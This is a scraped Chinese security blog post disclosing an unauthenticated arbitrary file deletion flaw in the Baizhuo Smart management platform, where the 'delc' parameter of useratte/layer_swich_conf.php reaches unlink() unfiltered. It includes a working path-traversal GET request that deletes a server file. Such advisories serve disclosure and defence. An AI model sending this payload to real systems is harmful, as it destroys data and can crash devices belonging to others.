---
title: "百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞"
source: https://mrxn.net/jswz/baizhuosmart-useratte-layer_swich_conf-filedel.html
asset_dir: assets/百卓smart管理平台-userattelayer_swich_conf.php-任意文件删除漏洞
---

# 百卓Smart管理平台 useratte/layer\_swich\_conf.php 任意文件删除漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/20 20:26
* 968浏览
* [0评论](#comment)
* 4分钟阅读

深入探索

数据库

安全

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 useratte/layer\_swich\_conf.php 接口存在任意文件删除漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")删除服务器上任意文件，造成系统崩溃不可运行。

漏洞扫描服务

# 漏洞分析

layer\_swich\_conf.php 主要业务逻辑代码如下

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-001-eda0fca93166.webp)](https://image.mrxn.net/40a0c9a166dd49a3b2429ce4ac937c34.webp)

直接对传入的 `delc` 值拼接到 unlink函数后的文件路径上，无任何过滤，造成任意文件删除漏洞。

Windows安全工具

# 漏洞复现

可通过其他漏洞如文件上传、sql注入写入文件后测试

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-002-34658d8ff177.webp)](https://image.mrxn.net/a09387ed62cd4ccab828a2524ce15ffa.webp)

```
GET /useratte/layer_swich_conf.php?delc=../../home/1.php HTTP/1.1
Host: smart.mrxn.net
```

删除后，再次访问之前的文件，已经404了，成功删除了该文件

[![百卓Smart管理平台 useratte/layer_swich_conf.php 任意文件删除漏洞](images/img-003-478b729b6738.webp)](https://image.mrxn.net/b83c0c6a0ff648c6ad39acf7f1c08467.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.漏洞分析](#toc-2-)
* [3.漏洞复现](#toc-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[百卓Smart管理平台 useratte/layer\_swich\_conf.php 任意文件删除漏洞](https://mrxn.net/jswz/baizhuosmart-useratte-layer_swich_conf-filedel.html)  
文章链接：<https://mrxn.net/jswz/baizhuosmart-useratte-layer_swich_conf-filedel.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-useratte-layer\_swich\_conf-filedel.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/baizhuosmart-useratte-layer\_swich\_conf-filedel.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 